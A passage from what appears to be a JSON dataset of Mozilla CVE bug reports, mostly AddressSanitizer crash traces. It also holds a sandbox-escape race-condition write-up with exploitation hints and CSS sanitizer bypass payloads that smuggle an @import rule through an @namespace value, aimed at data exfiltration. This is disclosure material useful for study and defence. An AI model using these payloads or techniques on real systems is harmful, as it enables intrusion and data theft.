/builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1680:29 in IsApzAwareListener Shadow bytes around the buggy address: 0x0c22803bc850: 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa 0x0c22803bc860: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c22803bc870: 00 00 00 00 00 00 00 00 00 00 00 04 fa fa fa fa 0x0c22803bc880: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c22803bc890: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c22803bc8a0:[fd]fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c22803bc8b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c22803bc8c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c22803bc8d0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c22803bc8e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c22803bc8f0: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==8535==ABORTING"
      }
    ],
    "CVE-2019-17011": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1591334",
        "title": "heap-use-after-free in SetOnstorage",
        "description": "This crash happens regularly while fuzzing an ASAN build of Firefox. It looks similar to https://bugzilla.mozilla.org/show_bug.cgi?id=1581084 , however it appears to have a different root cause. ==7681==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d0015973ab at pc 0x7fa664804962 bp 0x7ffe1f849af0 sp 0x7ffe1f849ae8 READ of size 1 at 0x61d0015973ab thread T0 (Web Content) #0 0x7fa664804961 in mozilla::EventListenerManager::SetEventHandlerInternal(nsAtom*, mozilla::TypedEventHandler const&, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:751:30 #1 0x7fa66480fc57 in mozilla::EventListenerManager::SetEventHandler(nsAtom*, mozilla::dom::EventHandlerNonNull*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1530:3 #2 0x7fa66355e7dc in SetOnstorage /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventNameList.h:315:1 #3 0x7fa66355e7dc in mozilla::dom::Window_Binding::set_onstorage(JSContext*, JS::Handle<JSObject*>, nsGlobalWindowInner*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:17747:24 #4 0x7fa66407413d in bool mozilla::dom::binding_detail::GenericSetter<mozilla::dom::binding_detail::MaybeCrossOriginObjectThisPolicy>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3146:8 #5 0x7fa66abbef99 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458:13 #6 0x7fa66abbef99 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:550:12 #7 0x7fa66abc5161 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:619:10 #8 0x7fa66abc5161 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:636:8 #9 0x7fa66abc5161 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:774:10 #10 0x7fa66b2ec273 in SetExistingProperty(JSContext*, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyResult>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2943:8 #11 0x7fa66b2e50cd in bool js::NativeSetProperty<(js::QualifiedBool)1>(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2972:14 #12 0x7fa66aef5597 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:283:10 #13 0x7fa66aef5597 in js::ForwardingProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:149:10 #14 0x7fa661560100 in nsOuterWindowProxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:944:23 #15 0x7fa66aed3725 in setInternal /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:395:19 #16 0x7fa66aed3725 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:403:10 #17 0x7fa66ab9db69 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:280:12 #18 0x7fa66ab9db69 in SetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:270:10 #19 0x7fa66ab9db69 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2875:12 #20 0x7fa66ab8997a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:425:10 #21 0x7fa66abc598f in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:812:13 #22 0x7fa66aca5b5d in js::DirectEvalStringFromIon(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::Handle<JS::Value>, JS::Handle<JSString*>, unsigned char*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:426:10 #23 0x207208d326ac (<unknown module>) 0x61d0015973ab is located 1323 bytes inside of 2048-byte region [0x61d001596e80,0x61d001597680) freed by thread T0 (Web Content) here: #0 0x55b307c17f4d in free /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:123:3 #1 0x7fa65d3f5486 in Free /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:198:34 #2 0x7fa65d3f5486 in nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::ShrinkCapacity(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:229:5 #3 0x7fa6647fdc19 in Clear /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTObserverArray.h:248:12 #4 0x7fa6647fdc19 in RemoveAllListenersSilently /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:148:14 #5 0x7fa6647fdc19 in mozilla::EventListenerManager::Disconnect() /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1316:3 #6 0x7fa661506c50 in nsGlobalWindowInner::FreeInnerObjects() /builds/worker/workspace/build/src/dom/base/nsGlobalWindowInner.cpp:1103:23 #7 0x7fa66156aab3 in nsGlobalWindowOuter::SetNewDocument(mozilla::dom::Document*, nsISupports*, bool, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:2231:19 #8 0x7fa667110a6a in nsDocumentViewer::InitInternal(nsIWidget*, nsISupports*, mozilla::dom::WindowGlobalChild*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, bool, bool, bool) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:983:22 #9 0x7fa66710fe1a in nsDocumentViewer::Init(nsIWidget*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:743:10 #10 0x7fa669d1e700 in nsDocShell::SetupNewViewer(nsIContentViewer*, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8379:7 #11 0x7fa669d1d609 in nsDocShell::Embed(nsIContentViewer*, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6154:17 #12 0x7fa669d28cab in nsDocShell::CreateAboutBlankContentViewer(nsIPrincipal*, nsIPrincipal*, nsIContentSecurityPolicy*, nsIURI*, bool, bool, mozilla::dom::WindowGlobalChild*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6991:14 #13 0x7fa669cd39ba in nsDocShell::EnsureContentViewer() /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6826:17 #14 0x7fa669d00e07 in GetDocument /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:3624:3 #15 0x7fa669d00e07 in non-virtual thunk to nsDocShell::GetDocument() /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #16 0x7fa66158e471 in nsGlobalWindowOuter::NotifyContentBlockingEvent(unsigned int, nsIChannel*, bool, nsIURI*, nsIChannel*, mozilla::Maybe<mozilla::AntiTrackingCommon::StorageAccessGrantedReason> const&) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:5404:38 #17 0x7fa66a3418c1 in (anonymous namespace)::NotifyBlockingDecisionInternal(nsIChannel*, nsIChannel*, mozilla::AntiTrackingCommon::BlockingDecision, unsigned int, nsIURI*, nsPIDOMWindowOuter*) /builds/worker/workspace/build/src/toolkit/components/antitracking/AntiTrackingCommon.cpp:892:12 #18 0x7fa66a32d81a in mozilla::AntiTrackingCommon::NotifyBlockingDecision(nsPIDOMWindowInner*, mozilla::AntiTrackingCommon::BlockingDecision, unsigned int) /builds/worker/workspace/build/src/toolkit/components/antitracking/AntiTrackingCommon.cpp:2126:3 #19 0x7fa66a345c35 in mozilla::StorageDisabledByAntiTracking(nsPIDOMWindowInner*, nsIChannel*, nsIPrincipal*, nsIURI*, unsigned int&) /builds/worker/workspace/build/src/toolkit/components/antitracking/StorageAccess.cpp:300:5 #20 0x7fa66a344886 in InternalStorageAllowedCheck(nsIPrincipal*, nsPIDOMWindowInner*, nsIURI*, nsIChannel*, nsICookieSettings*, unsigned int&) /builds/worker/workspace/build/src/toolkit/components/antitracking/StorageAccess.cpp:141:8 #21 0x7fa66a34439f in mozilla::StorageAllowedForWindow(nsPIDOMWindowInner*, unsigned int*) /builds/worker/workspace/build/src/toolkit/components/antitracking/StorageAccess.cpp:207:12 #22 0x7fa66153685e in nsGlobalWindowInner::GetLocalStorage(mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowInner.cpp:4544:26 #23 0x7fa661546fcc in nsGlobalWindowInner::EventListenerAdded(nsAtom*) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowInner.cpp:6100:5 #24 0x7fa6648048a5 in mozilla::EventListenerManager::SetEventHandlerInternal(nsAtom*, mozilla::TypedEventHandler const&, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:743:16 #25 0x7fa66480fc57 in mozilla::EventListenerManager::SetEventHandler(nsAtom*, mozilla::dom::EventHandlerNonNull*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1530:3 #26 0x7fa66355e7dc in SetOnstorage /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventNameList.h:315:1 #27 0x7fa66355e7dc in mozilla::dom::Window_Binding::set_onstorage(JSContext*, JS::Handle<JSObject*>, nsGlobalWindowInner*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:17747:24 #28 0x7fa66407413d in bool mozilla::dom::binding_detail::GenericSetter<mozilla::dom::binding_detail::MaybeCrossOriginObjectThisPolicy>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3146:8 #29 0x7fa66abbef99 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458:13 #30 0x7fa66abbef99 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:550:12 #31 0x7fa66abc5161 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:619:10 #32 0x7fa66abc5161 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:636:8 #33 0x7fa66abc5161 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:774:10 #34 0x7fa66b2ec273 in SetExistingProperty(JSContext*, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyResult>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2943:8 #35 0x7fa66b2e50cd in bool js::NativeSetProperty<(js::QualifiedBool)1>(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2972:14 #36 0x7fa66aef5597 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:283:10 #37 0x7fa66aef5597 in js::ForwardingProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:149:10 #38 0x7fa661560100 in nsOuterWindowProxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:944:23 previously allocated by thread T0 (Web Content) here: #0 0x55b307c184e9 in realloc /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:164:3 #1 0x55b307c4d75d in moz_xrealloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:72:18 #2 0x7fa65d3f4329 in Realloc /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:205:12 #3 0x7fa65d3f4329 in nsTArrayInfallibleAllocator::ResultTypeProxy nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::EnsureCapacity<nsTArrayInfallibleAllocator>(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:191:35 #4 0x7fa6647fe1e2 in ExtendCapacity<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:117:16 #5 0x7fa6647fe1e2 in AppendElements<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1694:49 #6 0x7fa6647fe1e2 in AppendElement<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1719:12 #7 0x7fa6647fe1e2 in AppendElement /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTObserverArray.h:192:46 #8 0x7fa6647fe1e2 in mozilla::EventListenerManager::AddEventListenerInternal(mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener>, mozilla::EventMessage, nsAtom*, mozilla::EventListenerFlags const&, bool, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:237:63 #9 0x7fa6648043ca in mozilla::EventListenerManager::SetEventHandlerInternal(nsAtom*, mozilla::TypedEventHandler const&, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:729:5 #10 0x7fa66480fc57 in mozilla::EventListenerManager::SetEventHandler(nsAtom*, mozilla::dom::EventHandlerNonNull*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1530:3 #11 0x7fa6635529fc in SetOnafterprint /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventNameList.h:276:1 #12 0x7fa6635529fc in mozilla::dom::Window_Binding::set_onafterprint(JSContext*, JS::Handle<JSObject*>, nsGlobalWindowInner*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:16694:24 #13 0x7fa66407413d in bool mozilla::dom::binding_detail::GenericSetter<mozilla::dom::binding_detail::MaybeCrossOriginObjectThisPolicy>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3146:8 #14 0x7fa66abbef99 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458:13 #15 0x7fa66abbef99 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:550:12 #16 0x7fa66abc5161 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:619:10 #17 0x7fa66abc5161 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:636:8 #18 0x7fa66abc5161 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:774:10 #19 0x7fa66b2ec273 in SetExistingProperty(JSContext*, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyResult>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2943:8 #20 0x7fa66b2e50cd in bool js::NativeSetProperty<(js::QualifiedBool)1>(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2972:14 #21 0x7fa66aef5597 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:283:10 #22 0x7fa66aef5597 in js::ForwardingProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:149:10 #23 0x7fa661560100 in nsOuterWindowProxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:944:23 #24 0x7fa66aed3725 in setInternal /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:395:19 #25 0x7fa66aed3725 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::PropertyKey>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:403:10 #26 0x7fa66ab9db69 in SetProperty /builds/worker/workspace/build/src/js/src/vm/ObjectOperations-inl.h:280:12 #27 0x7fa66ab9db69 in SetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:270:10 #28 0x7fa66ab9db69 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2875:12 #29 0x7fa66ab8997a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:425:10 #30 0x7fa66abc598f in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:812:13 #31 0x7fa66aca5b5d in js::DirectEvalStringFromIon(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::Handle<JS::Value>, JS::Handle<JSString*>, unsigned char*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:426:10 #32 0x207208d326ac (<unknown module>) SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:751:30 in mozilla::EventListenerManager::SetEventHandlerInternal(nsAtom*, mozilla::TypedEventHandler const&, bool) Shadow bytes around the buggy address: 0x0c3a802aae20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a802aae30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a802aae40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a802aae50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a802aae60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c3a802aae70: fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd 0x0c3a802aae80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a802aae90: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a802aaea0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a802aaeb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a802aaec0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==7681==ABORTING"
      }
    ],
    "CVE-2019-17015": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1599005",
        "title": "Race condition in firefox!sandbox::SharedMemIPCServer::Init leading to relative out-of-bounds read/write in the broker process (Sandbox escape / LPE)",
        "description": "Hi, These issues only affects Windows client, I found two race condition in the shared memory of Firefox sandbox implementation. Information Disclosure of broker heap address in CopyPolicyToTarget (race described in the next issue) Memory corruption (Sandbox escape) in sandbox::SharedMemIPCServer::ThreadPingEventReady (described in this issue) Vulnerability: Since Firefox (current version tested 70.0.1) configures the renderer sandbox with USER_LIMITED and Initial Integrity Level == Delayed Integrity Level (INTEGRITY_LEVEL_LOW), any renderer process can interact with other renderers process (read/write/createthread/duplicatehandles) even while new renderer process bootstrapping (when a new tab process is spawned). Google Chrome is not affected because the renderer processes runs with a USER_LOCKDOWN token (also the initial integrity level = LOW and delayed IL is UNTRUSTED) which prevent access to other renderer processes. The race condition vulnerability happens during new process bootstrapping, when a new tab process is created, the broker does: 1/ CreateProcess SUSPENDED with the lockdown token (USER_LIMITED for Firefox renderer) and low IL in TargetProcess::Create 2/ Assign target process to JOB object 3/ Change target thread token to initial token (USER_RESTRICTED_SAME_ACCESS) for initialisation later 4/ Create IPCServer shared memory in TargetProcess::Init 5/ DuplicateHandle the shared memory with the target in TargetProcess::Init 6/ Initialise the shared memory in SharedMemIPCServer::Init So, the target process is suspended but other tabs are not and they can access the target process (thanks to USER_LIMITED token and same IL) and duplicate the IPC shared memory handle. The shared memory initialisation is vulnerable to race condition when initialising service_context->channel_buffer in SharedMemIPCServer::Init (6): bool SharedMemIPCServer::Init(void* shared_mem, uint32_t shared_size, uint32_t channel_size) { .. client_control_ = reinterpret_cast<IPCControl*>(shared_mem); // client_control_ points to shared memory .. for (size_t ix = 0; ix != channel_count; ++ix) { ChannelControl* client_context = &client_control_->channels[ix]; // client_context points to shared memory .. client_context->channel_base = base_start; // (A) Write to shared memory (channel_base) client_context->state = kFreeChannel; .. service_context->shared_base = reinterpret_cast<char*>(shared_mem); service_context->channel_size = channel_size; service_context->channel = client_context; service_context->channel_buffer = service_context->shared_base + client_context->channel_base; // (B) Race condition between (A) and (B), read from shared memory (the value client_context->channel_base can be different) Source code in: https://github.com/mozilla/gecko-dev/blob/master/security/sandbox/chromium/sandbox/win/src/sharedmem_ipc_server.cc#L122 This vulnerability can lead to relative out-of-bounds read and write in the broker process in sandbox::SharedMemIPCServer::ThreadPingEventReady when the ping event is signaled. The pointer service_context->channel_buffer is fully controlled (64 bits added offset) due to the race condition. Crash: firefox!sandbox::CrossCallParams::GetParamsCount: 00007ff7c6ae4d60 8b4160 mov eax,dword ptr [rcx+60h] ds:424243c6124242a2=???????? 0:018> kc Call Site 00 firefox!sandbox::CrossCallParams::GetParamsCount 01 firefox!sandbox::CrossCallParamsEx::CreateFromBuffer 02 firefox!sandbox::SharedMemIPCServer::InvokeCallback 03 firefox!sandbox::SharedMemIPCServer::ThreadPingEventReady This exception is a first chance and handled by SEH, the second chance exception is: firefox!sandbox::SharedMemIPCServer::ThreadPingEventReady+0x8d: 00007ff7c6aff1bd 48894758 mov qword ptr [rdi+58h],rax ds:424243c61242429a=???????????????? during memcpy(call_params->GetCallReturn(), &call_result, sizeof(call_result)); Repro: I didn't work a lot to make the race reliable so the provided POC (attachment payload_corrupt) rarely triggers the vulnerability. To reproduce, please debug and break in the broker process between (A) and (B) to help the race on the first subchannel channel_base. Install Python 2.7 64 bits and PythonForWindows (https://github.com/hakril/PythonForWindows) then run inject.py with the payload_corrupt.dll path. Exploitability: The exploitation assumes having code execution in sandboxed renderers processes (RCE -> LPE step targeted). Since the race condition allow to corrupt the offset of the IPC channel buffer, you can overwrite data near the shared memory base in the broker without requiring an information disclosure vulnerability. Notice that the shared_base is close to the service_context address which is stored in the broker heap. dt firefox!sandbox::SharedMemIPCServer::ServerControl 0x00000183d630eec0 +0x018 channel_buffer : 0x424243c612424242 \"--- memory read error at address 0x424243c612424242 ---\" +0x020 shared_base : 0x00000183d0000000 \"???\" +0x028 channel : 0x00000183d0000010 sandbox::ChannelControl +0x030 dispatcher : 0x00000183`d7f36a00 sandbox::Dispatcher So, by spraying heap using an exploit convenient object (not researched), you can use this vulnerability to corrupt other heap allocation (craft fake IPC crosscall in the heap and corrupt adjacent allocations) and with some work, achieve code execution in Firefox main process (Sandbox escape). Thank you"
      }
    ],
    "CVE-2019-17016": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1599181",
        "title": "Bypass of CSS Sanitizer via incorrect serialization of CSS @namespace rule.",
        "description": "I've been recently researching the security of copy&paste in various browsers and noticed that Firefox perform CSS sanitization on <style> tags pasted from clipboard. The sanitizer could be abused in such a way that arbitrary CSS rules might be specified, allowing to data exfiltration attack. In a nutshell, a <style> tag is pasted verbatim if the sanitizer decides that it doesn't contain any harmful content. Otherwise it rewrites the stylesheet, and gets rid of certain rules. Please follow the examples below to see how I came up with the exploit: Example 1 INPUT: *{background:red} SANITIZED OUTPUT: *{background:red} COMMENT: The style is copied verbatim as it doesn't have any malicious rules. Example 2: INPUT: @import 'abc';*{background:red} SANITIZED OUTPUT: * { background: red none repeat scroll 0% 0%; } COMMENT: @import at-rule is disallowed, hence the CSS was rewritten. Example 3 INPUT: @import'abc';@namespace x 'aa';{background:#eee} SANITIZED OUTPUT: @namespace x url(\"aa\"); { background: rgb(238, 238, 238) none repeat scroll 0% 0%; } COMMENT: @namespace at-rule, on the other hand, is allowed. The URL of the namespace was rewritten from '...' syntax to url(\"...\") syntax. At this point I had an idea that perhaps a quote character within the URL wouldn't be escaped when rewritten to the url(\"...\") syntax. Example 4 INPUT: @import'abc';@namespace x 'a\"bc';{background:#eee} SANITIZED OUTPUT: @namespace x url(\"a\"bc\"); { background: rgb(238, 238, 238) none repeat scroll 0% 0%; } COMMENT: Please note the unescaped quote in the namespace URL. This means that arbitrary CSS rules can be injected - even @import! Example 5 INPUT: @import'abc';@namespace x 'a\"x);@import \"data:text/css,{background:blue}\";'; SANITIZED OUTPUT: @namespace x url(\"a\"x);@import \"data:text/css,{background:blue}\";\"); COMMENT: I'm injecting @import at-rule with data: URI to prove the vulnerability. At first sight it may appear as if the @import wouldn't execute since it follows @namespace which is disallowed. However, @namespace currently has an incorrect syntax (there's an \"x\" character right after closing quote), and is ignored by the CSS parser (as it was never there). @import is then treated as first valid rule of the CSS. Example 6 INPUT: @import'abc';*{background: url('aaa\"bbb')} SANITIZED OUTPUT: * { background: rgba(0, 0, 0, 0) url(\"aaa\"bbb\") repeat scroll 0% 0%; } COMMENT: Interestingly, the same problem doesn't happen in other contexts where rules are rewritten. This example shows that the URL of background is rewritten with proper escaping. To summarize: because of improper rewriting of @namespace rule, it's possible to inject arbitrary CSS style. PROOF OF CONCEPT: I have prepared a PoC which exfiltrates CSS token from a hidden input using this very technique. The scenario is that the page contains a rich editor (i.e. a contenteditable element on the page) and the user just pastes the malicious content from clipboard. Because of some quirks in implementation of the attack, it requires HTTP/2, so it's first needed to create self-signed certificates: Save css-exfiltration-firefox.js and vulnerable-page.html to some 